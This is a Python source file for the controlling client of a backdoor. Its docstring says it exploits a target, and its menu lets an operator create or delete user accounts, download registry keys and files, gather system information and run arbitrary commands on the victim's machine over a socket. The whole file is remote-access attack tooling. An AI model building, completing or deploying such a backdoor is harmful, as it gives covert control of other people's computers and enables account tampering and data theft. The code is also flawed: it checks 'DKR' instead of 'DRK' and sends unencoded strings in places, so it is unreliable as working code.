#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "2.0.1"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the client program that exploits a target, creating a backdoor and executing the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import socket, re, subprocess, time, struct

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len)

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)

def main():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    HOST = '127.0.0.1'
    PORT = 5000
    sock.connect((HOST,PORT))
    print("Which command do you wanna run on your target's machine?")
    print("Here are your options:")
    print("1) Create User (CU)")
    print("2) Delete User (DU)")
    print("3) Download Registry Key (DRK)")
    print("4) Download File (DF)")
    print("5) Gather Information (GI)")
    print("6) Execute a custom command (EC)")
    print("7) Exit (E)")
    print("So what is it going to be? (PLEASE SPECIFY THE CODE IN THE BRACKET)")
    invalid_flag = False
    while True:
        if invalid_flag == False:
            option = input(recv_data(sock).decode())
        else:
            option = input("Command: ")
        if (option.upper() != "CU") and (option.upper() != "DU") and (option.upper() != "DKR") and (option.upper() != "DF") and (option.upper() != "GI") and (option.upper() != "EC") and (option.upper() != "E"):
            print("Invalid Input. Please give a valid code (CU/DU/DRK/DF/GI/EC/E")
            invalid_flag = True
        else:
            send_data(sock, option)
            invalid_flag = False
            if (option.upper() == 'E'):
                break
            elif (option.upper() == 'EC'):
                command = input(recv_data(sock))
                send_data(sock, command.encode())
            elif (option.upper() == "CU"):
                username = input(recv_data(sock).decode())
                send_data(sock, username.encode())
                password = input(recv_data(sock).decode())
                send_data(sock,password.encode())
                print(recv_data(sock))
            elif (option.upper() == "DU"):
                username = input(recv_data(sock))
                send_data(sock, username.encode())
                print(recv_data(sock))
            else:
                send_data(sock, option.upper().encode())
                output = ""
                while True:
                    temp = recv_data(sock).decode()
                    if temp == "command executed successfully!":
                        break
                    output += temp



main()